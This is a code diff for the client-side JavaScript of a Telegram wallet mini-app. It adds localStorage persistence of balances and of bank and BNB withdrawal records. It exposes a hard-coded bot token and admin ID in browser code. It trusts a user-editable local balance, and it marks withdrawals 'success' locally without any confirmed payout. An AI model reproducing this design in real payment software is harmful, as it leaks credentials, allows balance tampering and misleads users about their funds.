@@ -120,7 +120,25 @@ Telegram.WebApp.expand();
 const user = Telegram.WebApp.initDataUnsafe.user || {};
 const BOT_TOKEN = "7514817340:AAHUpE5ZPEUZkkM4rq4smoV_nzWfmwWBVGc";
 const ADMIN_ID = "6940101627";
+/* =====================================
+   PERMANENT WALLET STORAGE (FOREVER)
+===================================== */
+const WALLET_KEY = "IM_WALLET_FOREVER";
 
+function saveWallet(data){
+  localStorage.setItem(WALLET_KEY, JSON.stringify(data));
+}
+
+function loadWallet(){
+  const raw = localStorage.getItem(WALLET_KEY);
+  if(!raw) return null;
+  try{
+    return JSON.parse(raw);
+  }catch(e){
+    localStorage.removeItem(WALLET_KEY);
+    return null;
+  }
+}
 /* exchange rate */
 let rate = 1500;
 fetch("https://open.er-api.com/v6/latest/USD")
@@ -133,9 +151,44 @@ username.textContent = user.username ? "@"+user.username : "No username";
 userid.textContent = "Telegram ID: "+(user.id||"");
 profilePic.src = user.photo_url || "https://via.placeholder.com/64";
 
-/* balance check (STRICT) */
-const hasWallet = walletBalances.hasOwnProperty(user.id);
-let balanceNGN = hasWallet ? walletBalances[user.id] : 0;
+/* balance check (LOCAL STORAGE FOREVER + AUTO SUCCESS WHEN balance.js CHANGES) */
+const savedWallet = loadWallet();
+let balanceNGN = 0;
+let hasWallet = false;
+
+/* PRIORITY 1: Use LocalStorage */
+if(savedWallet && savedWallet.userId === user.id){
+  balanceNGN = savedWallet.balanceNGN;
+  hasWallet = true;
+
+  // If admin updated balance.js to match current balance => approve pending withdrawals
+  const adminBalance = walletBalances[user.id];
+
+  if(typeof adminBalance === "number" && adminBalance === balanceNGN){
+    (savedWallet.history || []).forEach(h=>{
+      if(h.status === "pending"){
+        h.status = "success";
+        h.approvedAt = new Date().toISOString();
+      }
+    });
+
+    savedWallet.adminBalance = adminBalance;
+    saveWallet(savedWallet);
+  }
+}
+
+/* PRIORITY 2: First time only (from balance.js) */
+else if(walletBalances.hasOwnProperty(user.id)){
+  balanceNGN = walletBalances[user.id];
+  hasWallet = true;
+
+  saveWallet({
+    userId: user.id,
+    adminBalance: balanceNGN,
+    balanceNGN: balanceNGN,
+    history: []
+  });
+}
 
 /* lock withdraw if no wallet */
 if(!hasWallet){
@@ -200,6 +253,26 @@ function submitBank(){
 
   balanceNGN -= amt;
   updateUI();
+  // SAVE TO LOCAL STORAGE (PENDING)
+const walletData = loadWallet() || {
+  userId: user.id,
+  adminBalance: walletBalances[user.id] || balanceNGN,
+  balanceNGN: balanceNGN,
+  history: []
+};
+
+walletData.balanceNGN = balanceNGN;
+walletData.history = walletData.history || [];
+walletData.history.push({
+  type: "BANK",
+  amount: amt,
+  bank: bankName,
+  account: accountNumber.value,
+  name: accountName.value,
+  status: "pending",
+  requestedAt: new Date().toISOString()
+});
+saveWallet(walletData);
 
   // ADMIN MESSAGE
   sendTG(ADMIN_ID,
@@ -238,6 +311,19 @@ function submitBNB(){
 
   balanceNGN -= ngn;
   updateUI();
+// SAVE TO LOCAL STORAGE (PENDING)
+const walletData = loadWallet() || { userId: user.id, adminBalance: balanceNGN, balanceNGN: balanceNGN, history: [] };
+
+walletData.balanceNGN = balanceNGN;
+walletData.history = walletData.history || [];
+walletData.history.push({
+  type: "BNB",
+  usd: usd,
+  ngn: ngn,
+  status: "pending",
+  requestedAt: new Date().toISOString()
+});
+saveWallet(walletData);
 
   sendTG(ADMIN_ID,
 `Withdrawal Request
